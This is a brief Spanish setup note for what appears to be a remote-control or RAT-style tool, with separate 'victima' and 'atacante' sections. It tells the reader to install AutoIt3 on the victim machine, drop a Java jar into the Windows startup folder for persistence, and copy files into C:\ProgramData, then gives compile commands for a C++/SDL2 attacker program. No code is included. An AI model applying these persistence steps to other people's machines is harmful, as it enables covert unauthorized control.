victima:

-instalar Autoit3
-hacer acceso directo de Autoit3.exe y moverlo a la carpeta recieve (reemplazar "AutoIt3")

mover el jar a la carpeta de autoarranque: 
- menu run
- shell:startup   
  
y el contenido de la carpeta recieve a C:\ProgramData\recieve

para compilar:
javac Main.java
jar cvfe program.jar Main *.class

--------------------------------------------------------------------------
atacante:

para compilar:
g++ main.cpp `pkg-config --cflags --libs sdl2`
./a.out
